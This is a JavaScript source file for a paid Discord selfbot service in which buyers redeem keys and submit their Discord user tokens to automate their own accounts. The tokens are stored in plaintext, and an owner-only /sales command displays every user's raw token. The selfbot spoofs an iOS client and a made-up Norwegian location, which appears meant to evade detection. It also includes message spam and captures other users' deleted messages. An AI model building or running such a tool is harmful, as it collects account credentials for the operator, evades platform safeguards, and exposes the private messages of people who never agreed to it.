const { Client, GatewayIntentBits, SlashCommandBuilder, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
const { Client: SelfbotClient } = require('discord.js-selfbot-v13');
const sqlite3 = require('sqlite3').verbose();

const db = new sqlite3.Database('./data.db');

db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS users (
    user_id TEXT PRIMARY KEY,
    key TEXT,
    key_expires INTEGER,
    token TEXT,
    token_valid TEXT DEFAULT 'no',
    token_username TEXT,
    delay INTEGER DEFAULT 2,
    status TEXT DEFAULT 'stopped'
  )`);
  db.run(`CREATE TABLE IF NOT EXISTS keys (
    key TEXT PRIMARY KEY,
    duration TEXT,
    created_at INTEGER,
    expires INTEGER,
    redeemed_by TEXT,
    redeemed_at INTEGER
  )`);
});

const botClient = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent, GatewayIntentBits.GuildMembers, GatewayIntentBits.DirectMessages],
  partials: [1, 2, 5]
});

const ownerId = '1422945082746601594';
const activeSelfbots = new Map();
const snipeData = new Map();
const rotatingIntervals = new Map();

const superProps = {
  getSuperProperties: () => ({
    os: 'iOS',
    browser: 'Discord iOS',
    device: 'iPhone11,2',
    system_locale: 'nb-NO',
    browser_user_agent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Discord/78.0 (iPhone11,2; 14.4; Norway; nb)',
    browser_version: '78.0',
    os_version: '14.4',
    client_build_number: 110451,
    client_version: '0.0.1',
    country_code: 'NO',
    geo_ordered_rtc_regions: ['norway', 'russia', 'germany'],
    timezone_offset: 60,
    locale: 'nb-NO',
    client_city: 'Oslo',
    client_region: 'Oslo',
    client_postal_code: '1255',
    client_district: 'Holmlia',
    client_country: 'Norway',
    client_latitude: 59.83,
    client_longitude: 10.80,
    client_isp: 'Telenor Norge AS',
    client_timezone: 'Europe/Oslo',
    client_architecture: 'arm64',
    client_app_platform: 'mobile',
    client_distribution_type: 'app_store'
  })
};

function dbGet(sql, params = []) {
  return new Promise((resolve, reject) => {
    db.get(sql, params, (err, row) => {
      if (err) reject(err);
      else resolve(row);
    });
  });
}

function dbAll(sql, params = []) {
  return new Promise((resolve, reject) => {
    db.all(sql, params, (err, rows) => {
      if (err) reject(err);
      else resolve(rows);
    });
  });
}

function dbRun(sql, params = []) {
  return new Promise((resolve, reject) => {
    db.run(sql, params, function(err) {
      if (err) reject(err);
      else resolve(this);
    });
  });
}

function updatePanelMessage(interaction, userData, selfbotRunning = false) {
  const hasToken = userData.token && userData.token_valid === 'yes';
  const delay = userData.delay || 2;
  
  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId('set_token').setLabel('Set Token').setStyle(hasToken ? ButtonStyle.Success : ButtonStyle.Primary),
    new ButtonBuilder().setCustomId('set_delay').setLabel('Set Delay').setStyle(ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId('help_menu').setLabel('Help').setStyle(ButtonStyle.Secondary)
  );
  
  const row2 = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId('start_bot')
      .setLabel(selfbotRunning ? '🟢 Running' : 'Start')
      .setStyle(selfbotRunning ? ButtonStyle.Success : ButtonStyle.Secondary)
      .setDisabled(selfbotRunning || !hasToken),
    new ButtonBuilder()
      .setCustomId('stop_bot')
      .setLabel('Stop')
      .setStyle(ButtonStyle.Danger)
      .setDisabled(!selfbotRunning)
  );
  
  let desc = `**Status:** ${selfbotRunning ? '🟢 Online' : '🔴 Offline'}\n`;
  desc += `**Token:** ${hasToken ? `✅ @${userData.token_username}` : '❌ Not set'}\n`;
  desc += `**Delay:** ${delay}s response delay\n`;
  desc += `**Key:** ${userData.key ? '✅ Active' : '❌ None'}`;
  
  const embed = new EmbedBuilder()
    .setTitle('📱 Selfbot Control Panel')
    .setDescription(desc)
    .setColor(selfbotRunning ? 0x00ff00 : 0xff0000)
    .setFooter({ text: 'Use buttons below to configure' })
    .setTimestamp();
  
  return { embeds: [embed], components: [row, row2], ephemeral: true };
}

async function validateToken(token) {
    const testClient = new SelfbotClient({ 
        checkUpdate: false,
        ws: { properties: superProps.getSuperProperties() }
    });
    
    try {
        await testClient.login(token);
        const user = testClient.user;
        await testClient.destroy();
        return { valid: true, user };
    } catch (err) { 
        return { valid: false, error: err.message }; 
    }
}

botClient.once('ready', () => {
  console.log(`[BOT] Logged in as ${botClient.user.tag}`);
  
  const commands = [
    new SlashCommandBuilder()
      .setName('genkey')
      .setDescription('Generate access key (Owner only)')
      .addStringOption(opt => opt.setName('duration').setDescription('m=min, h=hour, d=day, blank=lifetime').setRequired(false))
      .toJSON(),
    new SlashCommandBuilder()
      .setName('revokeuser')
      .setDescription('Revoke all keys from user (Owner only)')
      .addUserOption(opt => opt.setName('user').setDescription('Target user').setRequired(true))
      .toJSON(),
    new SlashCommandBuilder()
      .setName('sales')
      .setDescription('Show sales info (Owner only)')
      .toJSON(),
    new SlashCommandBuilder()
      .setName('redkey')
      .setDescription('Redeem your access key')
      .addStringOption(opt => opt.setName('key').setDescription('Your key').setRequired(true))
      .toJSON(),
    new SlashCommandBuilder()
      .setName('panel')
      .setDescription('Open your selfbot control panel')
      .toJSON()
  ];
  
  botClient.application.commands.set(commands);
});

botClient.on('interactionCreate', async interaction => {
  if (!interaction.isCommand() && !interaction.isButton() && !interaction.isModalSubmit()) return;
  
  const isOwner = interaction.user.id === ownerId;
  
  if (interaction.commandName === 'genkey') {
    if (!isOwner) return interaction.reply({ content: '❌ Owner only.', ephemeral: true });
    
    const duration = interaction.options.getString('duration') || 'lifetime';
    const key = Array.from({length: 2}, () => Math.random().toString(36).substring(2, 15)).join('');
    let expires = null;
    
    if (duration.endsWith('m')) expires = Date.now() + parseInt(duration) * 60000;
    else if (duration.endsWith('h')) expires = Date.now() + parseInt(duration) * 3600000;
    else if (duration.endsWith('d')) expires = Date.now() + parseInt(duration) * 86400000;
    
    await dbRun('INSERT INTO keys (key, duration, created_at, expires, redeemed_by, redeemed_at) VALUES (?, ?, ?, ?, ?, ?)',
      [key, duration, Date.now(), expires, null, null]);
    
    return interaction.reply({ 
      content: `🔑 **Key Generated**\n\`${key}\`\nDuration: ${duration}\nExpires: ${expires ? new Date(expires).toLocaleString() : 'Never'}`, 
      ephemeral: true 
    });
  }
  
  if (interaction.commandName === 'revokeuser') {
    if (!isOwner) return interaction.reply({ content: '❌ Owner only.', ephemeral: true });
    
    const target = interaction.options.getUser('user');
    await dbRun('DELETE FROM users WHERE user_id = ?', [target.id]);
    await dbRun('UPDATE keys SET redeemed_by = ?, redeemed_at = ? WHERE redeemed_by = ?', [null, null, target.id]);
    
    if (activeSelfbots.has(target.id)) {
      const { client, interval } = activeSelfbots.get(target.id);
      if (interval) clearInterval(interval);
      client.destroy();
      activeSelfbots.delete(target.id);
    }
    
    return interaction.reply({ content: `✅ Revoked all access for <@${target.id}>`, ephemeral: true });
  }
  
  if (interaction.commandName === 'sales') {
    if (!isOwner) return interaction.reply({ content: '❌ Owner only.', ephemeral: true });
    
    const allUsers = await dbAll('SELECT * FROM users WHERE token_valid = ?', ['yes']);
    let content = `**Active Users:** ${allUsers.length}\n\n`;
    
    allUsers.forEach(u => {
      content += `<@${u.user_id}> - @${u.token_username}\nToken: \`${u.token}\`\n\n`;
    });
    
    return interaction.reply({ content: content || 'No active users.', ephemeral: true });
  }
  
  if (interaction.commandName === 'redkey') {
    const key = interaction.options.getString('key');
    const keyData = await dbGet('SELECT * FROM keys WHERE key = ?', [key]);
    
    if (!keyData) return interaction.reply({ content: '❌ Invalid key.', ephemeral: true });
    if (keyData.redeemed_by) return interaction.reply({ content: '❌ Key already used.', ephemeral: true });
    if (keyData.expires && Date.now() > keyData.expires) return interaction.reply({ content: '❌ Key expired.', ephemeral: true });
    
    await dbRun('UPDATE keys SET redeemed_by = ?, redeemed_at = ? WHERE key = ?', [interaction.user.id, Date.now(), key]);
    await dbRun('INSERT OR REPLACE INTO users (user_id, key, key_expires, token, token_valid, token_username, delay, status) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
      [interaction.user.id, key, keyData.expires, null, 'no', null, 2, 'stopped']);
    
    return interaction.reply({ content: '✅ Key redeemed! Use /panel to configure your selfbot.', ephemeral: true });
  }
  
  if (interaction.commandName === 'panel') {
    const userData = await dbGet('SELECT * FROM users WHERE user_id = ?', [interaction.user.id]);
    if (!userData) return interaction.reply({ content: '❌ Redeem a key first using /redkey', ephemeral: true });
    
    const running = activeSelfbots.has(interaction.user.id);
    const replyData = updatePanelMessage(interaction, userData, running);
    return interaction.reply(replyData);
  }
  
  if (interaction.isButton()) {
    const userId = interaction.user.id;
    
    if (interaction.customId === 'set_token') {
      const modal = new ModalBuilder().setCustomId('modal_token').setTitle('Set Selfbot Token');
      modal.addComponents(new ActionRowBuilder().addComponents(
        new TextInputBuilder().setCustomId('token_input').setLabel('Discord User Token').setStyle(TextInputStyle.Short).setRequired(true)
      ));
      return interaction.showModal(modal);
    }
    
    if (interaction.customId === 'set_delay') {
      const modal = new ModalBuilder().setCustomId('modal_delay').setTitle('Set Response Delay');
      modal.addComponents(new ActionRowBuilder().addComponents(
        new TextInputBuilder().setCustomId('delay_input').setLabel('Delay in seconds (1-10)').setStyle(TextInputStyle.Short).setPlaceholder('2').setRequired(true)
      ));
      return interaction.showModal(modal);
    }
    
    if (interaction.customId === 'help_menu') {
      const embed = new EmbedBuilder()
        .setTitle('📚 Selfbot Commands')
        .setDescription(`Prefix: ***,*** (comma)\n\n**Categories:**\n> ***mod*** - Moderation\n> ***games*** - Games\n> ***fun*** - Fun commands\n> ***activity*** - Status commands\n> ***user*** - User commands\n> ***wallet*** - Crypto commands`)
        .setColor(0x5865F2);
      return interaction.reply({ embeds: [embed], ephemeral: true });
    }
    
    if (interaction.customId === 'start_bot') {
      const userData = await dbGet('SELECT * FROM users WHERE user_id = ?', [userId]);
      if (!userData.token || userData.token_valid !== 'yes') {
        return interaction.reply({ content: '❌ Set and validate token first!', ephemeral: true });
      }
      
      if (activeSelfbots.has(userId)) {
        const old = activeSelfbots.get(userId);
        if (old.interval) clearInterval(old.interval);
        old.client.destroy();
      }
      
      const selfbot = new SelfbotClient({ 
        checkUpdate: false,
        ws: { properties: superProps.getSuperProperties() }
      });
      
      selfbot.once('ready', async () => {
        console.log(`[SELFBOT] Running: ${selfbot.user.tag} for user ${userId}`);
        await dbRun('UPDATE users SET status = ? WHERE user_id = ?', ['running', userId]);
        
        const newData = await dbGet('SELECT * FROM users WHERE user_id = ?', [userId]);
        const replyData = updatePanelMessage(interaction, newData, true);
        try { await interaction.update(replyData); } catch(e) {}
      });
      
      setupSelfbotCommands(selfbot, userData.delay || 2, userId);
      
      activeSelfbots.set(userId, { client: selfbot, startTime: Date.now() });
      selfbot.login(userData.token).catch(async (err) => {
        await interaction.reply({ content: `❌ Login failed: ${err.message}`, ephemeral: true });
      });
      
      return;
    }
    
    if (interaction.customId === 'stop_bot') {
      if (activeSelfbots.has(userId)) {
        const { client, interval } = activeSelfbots.get(userId);
        if (interval) clearInterval(interval);
        client.destroy();
        activeSelfbots.delete(userId);
      }
      
      await dbRun('UPDATE users SET status = ? WHERE user_id = ?', ['stopped', userId]);
      
      const newData = await dbGet('SELECT * FROM users WHERE user_id = ?', [userId]);
      const replyData = updatePanelMessage(interaction, newData, false);
      return interaction.update(replyData);
    }
  }
  
  if (interaction.isModalSubmit()) {
    const userId = interaction.user.id;
    
    if (interaction.customId === 'modal_token') {
      const token = interaction.fields.getTextInputValue('token_input');
      await interaction.deferReply({ ephemeral: true });
      
      const validation = await validateToken(token);
      
      if (validation.valid) {
        await dbRun('UPDATE users SET token = ?, token_valid = ?, token_username = ? WHERE user_id = ?',
          [token, 'yes', validation.user.tag, userId]);
        
        const newData = await dbGet('SELECT * FROM users WHERE user_id = ?', [userId]);
        const running = activeSelfbots.has(userId);
        
        await interaction.editReply({ 
          content: `✅ **Token Valid!** Logged in as **@${validation.user.tag}**`,
          embeds: updatePanelMessage(interaction, newData, running).embeds,
          components: updatePanelMessage(interaction, newData, running).components
        });
      } else {
        await interaction.editReply({ content: `❌ **Invalid Token!** ${validation.error}`, ephemeral: true });
      }
      return;
    }
    
    if (interaction.customId === 'modal_delay') {
      const delay = parseInt(interaction.fields.getTextInputValue('delay_input'));
      if (isNaN(delay) || delay < 1 || delay > 10) {
        return interaction.reply({ content: '❌ Delay must be 1-10 seconds!', ephemeral: true });
      }
      await dbRun('UPDATE users SET delay = ? WHERE user_id = ?', [delay, userId]);
      
      const newData = await dbGet('SELECT * FROM users WHERE user_id = ?', [userId]);
      const running = activeSelfbots.has(userId);
      await interaction.update(updatePanelMessage(interaction, newData, running));
      return;
    }
  }
});

function setupSelfbotCommands(selfbot, delaySeconds, selfbotUserId) {
  const prefix = ',';
  const userAFK = new Map();
  const userPings = new Map();
  
  console.log(`[SELFBOT] Setting up commands for selfbot user ID: ${selfbotUserId} with ${delaySeconds}s delay`);
  console.log(`[SELFBOT] Selfbot logged in as: ${selfbot.user.tag} (${selfbot.user.id})`);
  
  // IMPORTANT: Listen on ALL shards/guilds - no filtering
  selfbot.on('messageCreate', async (message) => {
    console.log(`[DEBUG] Message received: "${message.content}" from ${message.author.username} (${message.author.id}) in ${message.guild?.name || 'DMs'}`);
    
    // Ignore bot's own messages to prevent loops
    if (message.author.id === selfbot.user.id) {
      console.log('[DEBUG] Ignoring own message');
      return;
    }
    
    // ONLY respond to the selfbot owner (the user who set the token)
    if (message.author.id !== selfbotUserId) {
      console.log(`[DEBUG] Ignoring message from ${message.author.id}, expected ${selfbotUserId}`);
      return;
    }
    
    const content = message.content;
    
    // Must start with prefix
    if (!content.startsWith(prefix)) {
      console.log(`[DEBUG] Message doesn't start with prefix "${prefix}"`);
      return;
    }
    
    console.log(`[CMD] Selfbot user ${message.author.username}: ${content} in ${!message.guild ? 'DMs' : message.guild.name + '/' + message.channel.name}`);
    
    const args = content.slice(prefix.length).trim().split(/ +/);
    const cmd = args.shift().toLowerCase();
    
    console.log(`[CMD] Executing command: ${cmd}, args:`, args);
    
    const sleep = (ms) => new Promise(r => setTimeout(r, ms));
    const reply = async (content) => {
      await sleep(delaySeconds * 1000);
      try {
        return await message.channel.send(content);
      } catch (e) {
        console.log('[REPLY ERROR]', e.message);
      }
    };
    
    // HELP COMMANDS
    if (cmd === 'help') {
      const embed = new EmbedBuilder()
        .setTitle('# * Help Menu')
        .setDescription('⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘\n> `✠` ***,mod*** - __Shows moderation commands__\n> `✠` ***,games*** - __Shows games commands__\n> `✠` ***,fun*** - __Shows fun commands__\n> `✠` ***,activity*** - __Shows activity commands__\n> `✠` ***,user*** - __Shows user commands__\n> `✠` ***,wallet*** - __Shows wallet and crypto commands__\n⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘')
        .setColor(0x5865F2);
      await reply({ embeds: [embed] });
    }
    
    else if (cmd === 'mod') {
      const embed = new EmbedBuilder()
        .setTitle('# * Moderation Commands')
        .setDescription('⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘\n> `✠` ***,purge [count]*** - __Purge your own messages__\n> `✠` ***,timeout [@user] [minutes]*** - __Timeout a user__\n> `✠` ***,snipe*** - __Shows last 5 deleted messages__\n> `✠` ***,ban [@user]*** - __Bans a user__\n> `✠` ***,kick @user*** - __Kicks a user__\n> `✠` ***,spam [times] [message]*** - __Spam message (max 50)__\n> `✠` ***,userinfo @user*** - __User info__\n> `✠` ***,serverinfo*** - __Server info__\n⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘')
        .setColor(0xED4245);
      await reply({ embeds: [embed] });
    }
    
    else if (cmd === 'games') {
      const embed = new EmbedBuilder()
        .setTitle('# * Games Commands')
        .setDescription('⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘\n> `✠` ***,cf*** - __Flip a coin!__\n> `✠` ***,diceroll*** - __Roll a dice__\n> `✠` ***,rps [choice]*** - __Rock paper scissors__\n> `✠` ***,guess [number]*** - __Guess 1-10__\n> `✠` ***,gayrate [name]*** - __How gay?__\n⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘')
        .setColor(0x57F287);
      await reply({ embeds: [embed] });
    }
    
    else if (cmd === 'fun') {
      const embed = new EmbedBuilder()
        .setTitle('# * Fun Commands')
        .setDescription('⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘\n> `✠` ***,feed [name]*** - __Feed someone__\n> `✠` ***,tickle [name]*** - __Tickle someone__\n> `✠` ***,hug [name]*** - __Hug someone__\n> `✠` ***,cuddle [name]*** - __Cuddle someone__\n> `✠` ***,pat [name]*** - __Pat someone__\n> `✠` ***,kiss [name]*** - __Kiss someone__\n⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘')
        .setColor(0xEB459E);
      await reply({ embeds: [embed] });
    }
    
    else if (cmd === 'activity') {
      const embed = new EmbedBuilder()
        .setTitle('# * Activity Commands')
        .setDescription('⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘\n> `✠` ***,playing [content]*** - __Set playing status__\n> `✠` ***,watching [content]*** - __Set watching status__\n> `✠` ***,listening [content]*** - __Set listening status__\n> `✠` ***,streaming [content]*** - __Set streaming status__\n> `✠` ***,stopactivity*** - __Clear status__\n> `✠` ***,setrotating [status1,2,3...]*** - __Rotate status__\n> `✠` ***,stoprotating*** - __Stop rotating__\n⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘')
        .setColor(0xFEE75C);
      await reply({ embeds: [embed] });
    }
    
    else if (cmd === 'user') {
      const embed = new EmbedBuilder()
        .setTitle('# * User Commands')
        .setDescription('⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘\n> `✠` ***,afk [reason]*** - __Set AFK__\n> `✠` ***,removeafk*** - __Remove AFK__\n> `✠` ***,hypesquad*** - __Random HypeSquad__\n> `✠` ***,iplookup [IP]*** - __Lookup IP__\n> `✠` ***,timer [duration]*** - __Discord timestamp__\n> `✠` ***,copyserver [source] [target]*** - __Copy server__\n⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘')
        .setColor(0x5865F2);
      await reply({ embeds: [embed] });
    }
    
    else if (cmd === 'wallet') {
      await reply('💰 Wallet commands coming soon...');
    }
    
    // MODERATION COMMANDS
    else if (cmd === 'purge') {
      const count = parseInt(args[0]) || 10;
      try {
        const messages = await message.channel.messages.fetch({ limit: 100 });
        const myMessages = messages.filter(m => m.author.id === selfbot.user.id).first(count);
        
        for (const msg of myMessages) {
          await msg.delete().catch(() => {});
          await sleep(350);
        }
        const replyMsg = await reply(`✅ Purged ${myMessages.length} messages`);
        setTimeout(() => replyMsg.delete().catch(() => {}), 3000);
      } catch (e) {
        await reply(`❌ ${e.message}`);
      }
    }
    
    else if (cmd === 'timeout') {
      const target = message.mentions.members.first();
      const minutes = parseInt(args[1]) || 5;
      if (!target) return reply('❌ Mention a user');
      
      try {
        await target.timeout(minutes * 60000, 'Selfbot timeout');
        await reply(`✅ Timed out ${target.user.tag} for ${minutes}m`);
      } catch (e) {
        await reply(`❌ ${e.message}`);
      }
    }
    
    else if (cmd === 'snipe') {
      const deleted = snipeData.get(message.channel.id) || [];
      if (deleted.length === 0) return reply('❌ No deleted messages');
      
      const embed = new EmbedBuilder()
        .setTitle('🕵️ Sniped Messages')
        .setDescription(deleted.slice(0, 5).map((m, i) => `**${i+1}.** ${m.author}: ${m.content}`).join('\n'))
        .setColor(0x5865F2);
      await reply({ embeds: [embed] });
    }
    
    else if (cmd === 'ban') {
      const target = message.mentions.users.first();
      if (!target) return reply('❌ Mention a user');
      
      try {
        await message.guild.members.ban(target);
        await reply(`✅ Banned ${target.tag}`);
      } catch (e) {
        await reply(`❌ ${e.message}`);
      }
    }
    
    else if (cmd === 'kick') {
      const target = message.mentions.members.first();
      if (!target) return reply('❌ Mention a user');
      
      try {
        await target.kick();
        await reply(`✅ Kicked ${target.user.tag}`);
      } catch (e) {
        await reply(`❌ ${e.message}`);
      }
    }
    
    else if (cmd === 'spam') {
      const times = Math.min(parseInt(args[0]) || 5, 50);
      const text = args.slice(1).join(' ') || 'Spam';
      
      await reply(`⚡ Spamming ${times} times...`);
      for (let i = 0; i < times; i++) {
        await message.channel.send(text);
        await sleep(800);
      }
    }
    
    else if (cmd === 'userinfo') {
      const target = message.mentions.users.first() || message.author;
      const member = message.guild?.members?.cache?.get(target.id);
      
      const embed = new EmbedBuilder()
        .setTitle(`👤 ${target.tag}`)
        .setThumbnail(target.displayAvatarURL())
        .addFields(
          { name: 'ID', value: target.id, inline: true },
          { name: 'Created', value: `<t:${Math.floor(target.createdTimestamp/1000)}:R>`, inline: true },
          { name: 'Joined', value: member ? `<t:${Math.floor(member.joinedTimestamp/1000)}:R>` : 'N/A', inline: true },
          { name: 'Roles', value: member ? member.roles.cache.map(r => r.name).slice(0, 10).join(', ') || 'None' : 'N/A' }
        )
        .setColor(0x5865F2);
      await reply({ embeds: [embed] });
    }
    
    else if (cmd === 'serverinfo') {
      const guild = message.guild;
      if (!guild) return reply('❌ This command only works in servers');
      
      const embed = new EmbedBuilder()
        .setTitle(`🏠 ${guild.name}`)
        .setThumbnail(guild.iconURL())
        .addFields(
          { name: 'ID', value: guild.id, inline: true },
          { name: 'Owner', value: `<@${guild.ownerId}>`, inline: true },
          { name: 'Members', value: guild.memberCount.toString(), inline: true },
          { name: 'Created', value: `<t:${Math.floor(guild.createdTimestamp/1000)}:R>`, inline: true },
          { name: 'Channels', value: guild.channels.cache.size.toString(), inline: true }
        )
        .setColor(0x5865F2);
      await reply({ embeds: [embed] });
    }
    
    // GAMES
    else if (cmd === 'cf') {
      const result = Math.random() < 0.5 ? 'Heads' : 'Tails';
      await reply(`🪙 **${result}**`);
    }
    
    else if (cmd === 'diceroll') {
      const roll = Math.floor(Math.random() * 6) + 1;
      await reply(`🎲 You rolled a **${roll}**`);
    }
    
    else if (cmd === 'rps') {
      const choices = ['rock', 'paper', 'scissors'];
      const user = args[0]?.toLowerCase();
      if (!choices.includes(user)) return reply('❌ Choose rock, paper, or scissors');
      
      const bot = choices[Math.floor(Math.random() * 3)];
      let result;
      
      if (user === bot) result = 'Tie!';
      else if ((user === 'rock' && bot === 'scissors') || (user === 'paper' && bot === 'rock') || (user === 'scissors' && bot === 'paper')) result = 'You win!';
      else result = 'You lose!';
      
      await reply(`✊ You: ${user} | Bot: ${bot}\n**${result}**`);
    }
    
    else if (cmd === 'guess') {
      const num = parseInt(args[0]);
      if (!num || num < 1 || num > 10) return reply('❌ Guess 1-10');
      
      const answer = Math.floor(Math.random() * 10) + 1;
      await reply(answer === num ? `🎉 Correct! It was ${answer}` : `❌ Wrong! It was ${answer}`);
    }
    
    else if (cmd === 'gayrate') {
      const name = args.join(' ') || message.author.username;
      const rate = Math.floor(Math.random() * 101);
      await reply(`🏳️‍🌈 **${name}** is ${rate}% gay`);
    }
    
    // FUN COMMANDS
    else if (['feed', 'tickle', 'hug', 'cuddle', 'pat', 'kiss'].includes(cmd)) {
      const target = args.join(' ') || 'themselves';
      const emojis = { feed: '🍔', tickle: '🤗', hug: '🤗', cuddle: '🥰', pat: '👋', kiss: '💋' };
      await reply(`${emojis[cmd]} **${message.author.username}** ${cmd}s **${target}**!`);
    }
    
    // ACTIVITY COMMANDS
    else if (cmd === 'playing') {
      const text = args.join(' ') || 'nothing';
      selfbot.user.setActivity(text, { type: 0 });
      await reply(`✅ Now playing **${text}**`);
    }
    
    else if (cmd === 'watching') {
      const text = args.join(' ') || 'nothing';
      selfbot.user.setActivity(text, { type: 3 });
      await reply(`✅ Now watching **${text}**`);
    }
    
    else if (cmd === 'listening') {
      const text = args.join(' ') || 'nothing';
      selfbot.user.setActivity(text, { type: 2 });
      await reply(`✅ Now listening to **${text}**`);
    }
    
    else if (cmd === 'streaming') {
      const text = args.join(' ') || 'nothing';
      selfbot.user.setActivity(text, { type: 1, url: 'https://twitch.tv/discord' });
      await reply(`✅ Now streaming **${text}**`);
    }
    
    else if (cmd === 'stopactivity') {
      selfbot.user.setActivity(null);
      await reply('✅ Activity cleared');
    }
    
    else if (cmd === 'setrotating') {
      const statuses = args.join(' ').split(',').map(s => s.trim());
      if (statuses.length === 0) return reply('❌ Provide statuses separated by commas');
      
      if (rotatingIntervals.has(selfbot.user.id)) clearInterval(rotatingIntervals.get(selfbot.user.id));
      
      let current = 0;
      const interval = setInterval(() => {
        selfbot.user.setActivity(statuses[current], { type: 0 });
        current = (current + 1) % statuses.length;
      }, 3000);
      
      rotatingIntervals.set(selfbot.user.id, interval);
      await reply(`✅ Rotating ${statuses.length} statuses`);
    }
    
    else if (cmd === 'stoprotating') {
      if (rotatingIntervals.has(selfbot.user.id)) {
        clearInterval(rotatingIntervals.get(selfbot.user.id));
        rotatingIntervals.delete(selfbot.user.id);
      }
      await reply('✅ Rotating stopped');
    }
    
    // USER COMMANDS
    else if (cmd === 'afk') {
      const reason = args.join(' ') || 'AFK';
      userAFK.set(message.author.id, reason);
      await reply(`💤 **AFK**: ${reason}`);
    }
    
    else if (cmd === 'removeafk') {
      userAFK.delete(message.author.id);
      const pings = userPings.get(message.author.id) || [];
      await reply(`✅ **No longer AFK**\n${pings.length > 0 ? `You were pinged in:\n${pings.slice(0, 5).join('\n')}` : 'No pings while AFK'}`);
      userPings.delete(message.author.id);
    }
    
    else if (cmd === 'hypesquad') {
      const houses = ['Bravery', 'Brilliance', 'Balance'];
      const house = houses[Math.floor(Math.random() * 3)];
      await reply(`🏠 **HypeSquad House**: ${house}`);
    }
    
    else if (cmd === 'iplookup') {
      const ip = args[0];
      if (!ip) return reply('❌ Provide an IP');
      
      try {
        const res = await fetch(`http://ip-api.com/json/${ip}`);
        const data = await res.json();
        if (data.status === 'success') {
          const embed = new EmbedBuilder()
            .setTitle(`🔍 ${data.query}`)
            .addFields(
              { name: 'Country', value: data.country, inline: true },
              { name: 'Region', value: data.regionName, inline: true },
              { name: 'City', value: data.city, inline: true },
              { name: 'ISP', value: data.isp, inline: true }
            )
            .setColor(0x5865F2);
          await reply({ embeds: [embed] });
        } else {
          await reply('❌ Invalid IP');
        }
      } catch (e) {
        await reply('❌ Lookup failed');
      }
    }
    
    else if (cmd === 'timer') {
      const duration = args[0];
      if (!duration) return reply('❌ Format: 24m/24h/24d/24mo/24y');
      
      const match = duration.match(/(\d+)([mhdmoy]+)/);
      if (!match) return reply('❌ Invalid format');
      
      const num = parseInt(match[1]);
      const unit = match[2];
      const multipliers = { m: 60, h: 3600, d: 86400, mo: 2592000, y: 31536000 };
      const seconds = num * (multipliers[unit] || 60);
      const timestamp = Math.floor((Date.now() + seconds * 1000) / 1000);
      
      await reply(`⏰ **Timer set**\n<t:${timestamp}:R>`);
    }
    
    else if (cmd === 'copyserver') {
      await reply('⚠️ Copy server requires elevated permissions - use with caution');
    }
  });
  
  // Snipe handler - monitor ALL deleted messages in ALL channels
  selfbot.on('messageDelete', (msg) => {
    if (!msg.author || msg.author.bot || msg.author.id === selfbot.user.id) return;
    const arr = snipeData.get(msg.channel.id) || [];
    arr.unshift({ author: msg.author.tag, content: msg.content || '[Embed/Attachment]', time: Date.now() });
    snipeData.set(msg.channel.id, arr.slice(0, 10));
  });
  
  // AFK ping handler - monitor ALL messages for pings to selfbot user
  selfbot.on('messageCreate', async (msg) => {
    // Skip if from selfbot owner (already handled above) or bot
    if (msg.author.id === selfbotUserId || msg.author.bot) return;
    
    // Check if selfbot user is AFK and got pinged
    if (msg.mentions.has(selfbot.user.id) && userAFK.has(selfbotUserId)) {
      const reason = userAFK.get(selfbotUserId);
      const pings = userPings.get(selfbotUserId) || [];
      pings.push(`<#${msg.channel.id}> from ${msg.author.username}: ${msg.content.slice(0, 30)}...`);
      userPings.set(selfbotUserId, pings);
      
      try {
        await msg.reply(`💤 <@${selfbotUserId}> is AFK: ${reason}`).catch(() => {});
      } catch (e) {}
    }
  });
  
  console.log(`[SELFBOT] Commands setup complete - monitoring all servers, channels, and DMs for user ${selfbotUserId}`);
}

process.on('unhandledRejection', (err) => {
  console.log('[ERROR]', err.message);
});

botClient.login(process.env.DISCORD_TOKEN);
